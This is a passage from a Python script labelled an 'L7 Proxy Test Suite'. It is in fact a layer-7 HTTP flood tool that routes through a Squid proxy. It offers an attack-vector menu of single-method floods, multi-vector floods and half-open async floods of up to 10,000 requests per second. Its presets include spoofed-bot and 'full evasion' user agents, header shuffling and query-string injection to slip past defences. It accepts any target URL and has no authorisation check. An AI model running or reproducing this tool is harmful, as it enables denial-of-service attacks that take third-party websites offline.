        avg = sum(latencies) / len(latencies)
        p50 = latencies[int(len(latencies) * 0.50)]
        p90 = latencies[int(len(latencies) * 0.90)]
        p99 = latencies[int(len(latencies) * 0.99)]
        ok("Latency avg    : {:.1f} ms".format(avg))
        ok("Latency p50    : {:.1f} ms".format(p50))
        ok("Latency p90    : {:.1f} ms".format(p90))
        ok("Latency p99    : {:.1f} ms".format(p99))

    print("\n  {}HTTP status breakdown:{}".format(DIM, RESET))
    for code in sorted(status_counts):
        col = GREEN if str(code).startswith("2") else (
              YELLOW if str(code).startswith("3") else RED)
        print("    {}HTTP {}{} : {:,}".format(col, code, RESET, status_counts[code]))

    return {
        "method":     display_label,
        "total":      total_sent[0],
        "success":    success[0],
        "errors":     errors[0],
        "wall":       wall_elapsed,
        "rps_actual": total_sent[0] / wall_elapsed if wall_elapsed > 0 else 0,
    }


def run_multi_vector(target_url, workers, rps, duration):
    # type: (str, int, float, float) -> None
    """
    Launch all 7 HTTP methods simultaneously, each with its own thread pool.
    Workers and RPS are split evenly across vectors.
    """
    methods = ["GET", "POST", "HEAD", "PUT", "PATCH", "DELETE", "OPTIONS"]
    n       = len(methods)
    w_each  = max(1, workers // n)
    r_each  = max(1.0, rps / n)

    section(
        "MULTI-VECTOR FLOOD  |  {} vectors simultaneously\n"
        "  {}{} total conns ({}/vector)  |  {:.0f} total RPS ({:.1f}/vector)  |  {:.0f}s{}\n"
        "  {}Vectors : {}{}\n"
        "  {}Target  : {}{}".format(
            n,
            CYAN, workers, w_each, rps, r_each, duration, RESET,
            CYAN, ", ".join(methods), RESET,
            CYAN, target_url, RESET,
        )
    )

    results     = []   # type: List[Dict]
    result_lock = threading.Lock()

    def _launch(method):
        r = run_flood(
            target_url=target_url,
            workers=w_each,
            rps=r_each,
            duration=duration,
            method=method,
            label=method,
        )
        with result_lock:
            results.append(r)

    threads = [threading.Thread(target=_launch, args=(m,), daemon=True) for m in methods]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    total_sent    = sum(r["total"]      for r in results)
    total_success = sum(r["success"]    for r in results)
    total_errors  = sum(r["errors"]     for r in results)
    combined_rps  = sum(r["rps_actual"] for r in results)

    print("\n{}{}{}{}".format(BOLD, MAGENTA, "="*60, RESET))
    print("{}{}  MULTI-VECTOR AGGREGATE SUMMARY{}".format(BOLD, MAGENTA, RESET))
    print("{}{}{}{}".format(BOLD, MAGENTA, "="*60, RESET))
    ok("Vectors fired  : {}  ({})".format(n, ", ".join(methods)))
    ok("Total requests : {:,}".format(total_sent))
    ok("Succeeded      : {}{:,}{}".format(GREEN, total_success, RESET))
    if total_errors:
        warn("Failed         : {}{:,}{}".format(RED, total_errors, RESET))
    ok("Combined RPS   : {}{:.1f}{}".format(BOLD, combined_rps, RESET))
    print("\n  {:<10} {:>8} {:>8} {:>8} {:>8}".format("Method", "Sent", "2xx", "Fail", "RPS"))
    print("  {}".format("─"*46))
    for r in sorted(results, key=lambda x: x["method"]):
        print("  {}{:<10}{}  {:>8,}  {}{:>8,}{}  {}{:>8,}{}  {:>8.1f}".format(
            CYAN, r["method"], RESET,
            r["total"],
            GREEN, r["success"], RESET,
            RED, r["errors"], RESET,
            r["rps_actual"],
        ))
    print("\n{}{}{}{}".format(BOLD, MAGENTA, "="*60, RESET))
    print()


# ─────────────────────────────────────────────────────────────────────────────
# Interactive helpers
# ─────────────────────────────────────────────────────────────────────────────

def _prompt_int(prompt, default):
    # type: (str, int) -> int
    try:
        raw = input("  {}{}{} [{}]: ".format(BOLD, prompt, RESET, default)).strip()
        return int(raw) if raw else default
    except (ValueError, KeyboardInterrupt, EOFError):
        return default


def _prompt_float(prompt, default):
    # type: (str, float) -> float
    try:
        raw = input("  {}{}{} [{}]: ".format(BOLD, prompt, RESET, default)).strip()
        return float(raw) if raw else default
    except (ValueError, KeyboardInterrupt, EOFError):
        return default


ATTACK_MENU = [
    ("Diagnostic (10 sequential tests)",            "diag"),
    ("GET Flood",                                    "GET"),
    ("POST Flood",                                   "POST"),
    ("HEAD Flood",                                   "HEAD"),
    ("PUT Flood",                                    "PUT"),
    ("PATCH Flood",                                  "PATCH"),
    ("DELETE Flood",                                 "DELETE"),
    ("OPTIONS Flood",                                "OPTIONS"),
    ("Multi-Vector (all methods at once)",           "multi"),
    ("Half-Open GET  [5k+ RPS, no response read]",  "ho_GET"),
    ("Half-Open POST [5k+ RPS, no response read]",  "ho_POST"),
    ("Half-Open HEAD [5k+ RPS, no response read]",  "ho_HEAD"),
]


def show_menu():
    # type: () -> str
    """Print the attack-vector menu and return the chosen mode key."""
    print("\n{}{}\u250c{}{}\u2500{}{}{}\u2510{}".format(
        BOLD, CYAN, RESET, BOLD+CYAN, "\u2500"*45, BOLD, CYAN, RESET, ""))
    print("{}{}  \u2502{}  {}SELECT ATTACK VECTOR{}                    {}{}  \u2502{}".format(
        BOLD, CYAN, RESET, BOLD, RESET, BOLD, CYAN, RESET))
    print("{}{}\u251c{}{}\u2500{}{}{}\u2524{}".format(
        BOLD, CYAN, RESET, BOLD+CYAN, "\u2500"*45, BOLD, CYAN, RESET, ""))
    for i, (label, key) in enumerate(ATTACK_MENU, 1):
        icon = "\u26a1" if key == "multi" else ("\U0001f50d" if key == "diag" else "\U0001f4a5")
        print("{}{}  \u2502{}  {}{:>2}.{} {}  {:<38}{}{}  \u2502{}".format(
            BOLD, CYAN, RESET,
            BOLD, i, RESET,
            icon, label,
            BOLD, CYAN, RESET,
        ))
    print("{}{}\u2514{}{}\u2500{}{}{}\u2518{}".format(
        BOLD, CYAN, RESET, BOLD+CYAN, "\u2500"*45, BOLD, CYAN, RESET, ""))

    while True:
        try:
            raw = input("\n  {}Enter choice (1\u2013{}): {}".format(
                BOLD, len(ATTACK_MENU), RESET)).strip()
            idx = int(raw) - 1
            if 0 <= idx < len(ATTACK_MENU):
                label, mode = ATTACK_MENU[idx]
                print("  {}\u2714  Selected:{} {}{}{}".format(
                    GREEN, RESET, BOLD, label, RESET))
                return mode
            else:
                warn("Please enter a number between 1 and {}".format(len(ATTACK_MENU)))
        except (ValueError, KeyboardInterrupt, EOFError):
            print("\nAborted.")
            sys.exit(0)


# ─────────────────────────────────────────────────────────────────────────────
# Flood Preset table
# Each entry: (label, conns, rps, duration_s, ua_profile, hdr_shuffle, qs_mode)
# Last entry is "custom" – will prompt for conns/rps/duration + profile choices
# ─────────────────────────────────────────────────────────────────────────────
_PRESETS = [
    # label                                  conns    rps   dur   ua_profile        shuffle  qs
    ("Light    – legit desktop",                25,    50,   30, "legit_desktop",   False, "off"),
    ("Medium   – legit desktop",                50,   100,   60, "legit_desktop",   False, "off"),
    ("Heavy    – legit desktop",               100,   250,   60, "legit_desktop",   False, "off"),
    ("Light    – legit mobile",                 25,    50,   30, "legit_mobile",    False, "off"),
    ("Medium   – legit mobile",                 50,   100,   60, "legit_mobile",    False, "off"),
    ("Light    – spoofed bots",                 25,    50,   30, "spoofed_bots",    False, "off"),
    ("Medium   – spoofed bots + shuffle",       50,   100,   60, "spoofed_bots",    True,  "random"),
    ("Heavy    – full evasion + QS",           100,   250,   60, "spoofed_evasion", True,  "always"),
    ("Blitz    – rotate all + shuffle",        150,   500,   30, "rotate",          True,  "random"),
    # ── Half-open high-RPS presets (asyncio, no response read) ───────────────
    ("HalfOpen – 1k RPS  [async, 200 slots]",  200,  1000,  30, "rotate",          True,  "random"),
    ("HalfOpen – 5k RPS  [async, 500 slots]",  500,  5000,  30, "rotate",          True,  "always"),
    ("HalfOpen – 10k RPS [async, 1000 slots]",1000, 10000,  30, "rotate",          True,  "always"),
    # ── Custom ───────────────────────────────────────────────────────────────
    ("Custom   – set your own values",            0,     0,   0, "",                False, "off"),
]


def show_preset_menu():
    # type: () -> Tuple[int, float, float]
    """
    Show the unified flood preset table.
    One selection sets conns, RPS, duration, UA profile, header shuffle, and QS.
    Returns (workers, rps, duration).
    """
    hdr = "{:<34} {:>5} {:>6} {:>5}  {:<18} {:^7} {:^8}".format(
        "Preset", "Conns", "RPS", "Dur", "UA Profile", "Shuffle", "QS")
    div = "\u2500" * 90

    print("\n{}{}  \u2500\u2500 Flood Preset \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{}".format(BOLD, CYAN, RESET))
    print("  {}{}{}".format(DIM, hdr, RESET))
    print("  {}{}{}".format(DIM, div, RESET))

    for i, (label, conns, rps, dur, ua, shuf, qs) in enumerate(_PRESETS, 1):
        is_custom = (conns == 0)
        conns_s = "–" if is_custom else str(conns)
        rps_s   = "–" if is_custom else str(rps)
        dur_s   = "–" if is_custom else "{}s".format(dur)
        ua_s    = "you choose" if is_custom else ua
        shuf_s  = "–" if is_custom else ("\u2713" if shuf else "\u2717")
        qs_s    = "–" if is_custom else qs
        row = "{:>2}. {:<30} {:>5} {:>6} {:>5}  {:<18} {:^7} {:^8}".format(
            i, label, conns_s, rps_s, dur_s, ua_s, shuf_s, qs_s)
        colour = MAGENTA if is_custom else CYAN
        print("  {}{}{}".format(colour, row, RESET))

    while True:
        try:
            raw = input("\n  {}Select preset (1\u2013{}): {}".format(
                BOLD, len(_PRESETS), RESET)).strip()
            if not raw:
                continue
            idx = int(raw) - 1
            if not (0 <= idx < len(_PRESETS)):
                warn("Enter 1\u2013{}".format(len(_PRESETS)))
                continue
        except (ValueError, KeyboardInterrupt, EOFError):
            print("\nAborted.")
            sys.exit(0)

        label, conns, rps, dur, ua, shuf, qs = _PRESETS[idx]

        if conns == 0:
            # Custom path – ask for values + profile
            print("\n{}{}  \u2500\u2500 Custom Parameters \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{}".format(BOLD, CYAN, RESET))
            conns = _prompt_int("Concurrent connections", 50)
            rps   = _prompt_float("Target RPS", 100.0)
            dur   = _prompt_float("Duration (seconds)", 30.0)

            # UA profile sub-menu
            print("\n  {}UA Profile:{} (1) rotate  (2) legit_desktop  (3) legit_mobile  (4) spoofed_bots  (5) spoofed_evasion".format(BOLD, RESET))
            _ua_opts = ["rotate", "legit_desktop", "legit_mobile", "spoofed_bots", "spoofed_evasion"]
            try:
                ua_raw = input("  {}Choice [1]: {}".format(BOLD, RESET)).strip()
                ua_idx = int(ua_raw) - 1 if ua_raw else 0
                ua = _ua_opts[ua_idx] if 0 <= ua_idx < len(_ua_opts) else "rotate"
            except (ValueError, KeyboardInterrupt, EOFError):
                ua = "rotate"

            # Header shuffle
            try:
                shuf_raw = input("  {}Shuffle header order? (y/n) [n]: {}".format(BOLD, RESET)).strip().lower()
                shuf = shuf_raw in ("y", "yes", "1")
            except (KeyboardInterrupt, EOFError):
                shuf = False

            # QS inject
            print("  {}Query-string inject:{} (1) off  (2) random 50%  (3) always".format(BOLD, RESET))
            _qs_opts = ["off", "random", "always"]
            try:
                qs_raw = input("  {}Choice [1]: {}".format(BOLD, RESET)).strip()
                qs_idx = int(qs_raw) - 1 if qs_raw else 0
                qs = _qs_opts[qs_idx] if 0 <= qs_idx < len(_qs_opts) else "off"
            except (ValueError, KeyboardInterrupt, EOFError):
                qs = "off"

        # Apply config
        _EVASION_PROFILE[0] = ua
        _HEADER_SHUFFLE[0]  = shuf
        _QS_INJECT[0]       = qs

        shuf_display = "{}on{}".format(GREEN, RESET) if shuf else "{}off{}".format(DIM, RESET)
        print("\n  {}\u2714  Preset:{} {}{}{}".format(GREEN, RESET, BOLD, label, RESET))
        info("UA profile : {}{}{}".format(BOLD, ua, RESET))
        info("Hdr shuffle: {}".format(shuf_display))
        info("QS inject  : {}{}{}".format(BOLD, qs, RESET))

        return int(conns), float(rps), float(dur)


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    print("\n{}{}{}".format(BOLD, "="*60, RESET))
    print("{}  L7 Proxy Test Suite \u2014 Squid @ {}:{}{}".format(
        BOLD, PROXY_HOST, PROXY_PORT, RESET))
    print("{}{}{}".format(BOLD, "="*60, RESET))
    print("{}  Started : {}{}".format(
        DIM, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), RESET))

    try:
        raw = input("\n{}  Enter target URL (e.g. https://example.com): {}".format(
            BOLD, RESET)).strip()
    except (KeyboardInterrupt, EOFError):
        print("\nAborted.")
        sys.exit(0)

    if not raw:
        fail("No URL provided. Exiting.")
        sys.exit(1)

    if not raw.startswith("http://") and not raw.startswith("https://"):
        raw = "https://" + raw

    parsed     = urllib.parse.urlparse(raw)
    target_url = raw
    hostname   = parsed.hostname or ""
    use_https  = parsed.scheme == "https"
    tls_port   = parsed.port or 443

    print("\n{}  Target URL : {}{}".format(DIM, target_url, RESET))
    print("{}  Hostname   : {}{}".format(DIM, hostname, RESET))
    print("{}  Proxy      : {}{}".format(DIM, PROXY_URL, RESET))

    if not test_proxy_reachability():
        fail("Proxy is unreachable \u2014 aborting.")
        sys.exit(1)

    mode = show_menu()

    if mode == "diag":
        test_egress_ip()
        if hostname and not all(c.isdigit() or c == "." for c in hostname):
            test_dns(hostname)
        test_http_get(target_url)
        test_http_head(target_url)
        test_http_options(target_url)
        test_redirect_chain(target_url)
        if use_https and hostname:
            test_tls(hostname, port=tls_port)
        test_http_post(target_url)
        test_latency(target_url)
        print("\n{}{}{}".format(BOLD+GREEN, "="*60, RESET))
        print("{}  All L7 tests complete.{}".format(BOLD+GREEN, RESET))
        print("{}{}{}".format(BOLD+GREEN, "="*60, RESET))
        print()
        return

    workers, rps, duration = show_preset_menu()
    print("\n{}  Workers : {}  |  RPS target : {:.0f}  |  Duration : {:.0f}s{}".format(
        DIM, workers, rps, duration, RESET))

    if mode == "multi":
        run_multi_vector(target_url, workers=workers, rps=rps, duration=duration)
    elif mode.startswith("ho_"):
        # Half-open async flood — extract HTTP method from mode key (ho_GET → GET)
        ho_method = mode[3:]
        run_half_open_flood(
            target_url=target_url,
            concurrency=workers,
            rps=rps,
            duration=duration,
            method=ho_method,
        )
        print("\n{}{}{}".format(BOLD+GREEN, "="*60, RESET))
        print("{}  Half-open flood complete.{}".format(BOLD+GREEN, RESET))
        print("{}{}{}".format(BOLD+GREEN, "="*60, RESET))
        print()
    else:
        run_flood(target_url=target_url, workers=workers, rps=rps,
                  duration=duration, method=mode)
        print("\n{}{}{}".format(BOLD+GREEN, "="*60, RESET))
        print("{}  Flood complete.{}".format(BOLD+GREEN, RESET))
        print("{}{}{}".format(BOLD+GREEN, "="*60, RESET))
        print()


if __name__ == "__main__":
    main()
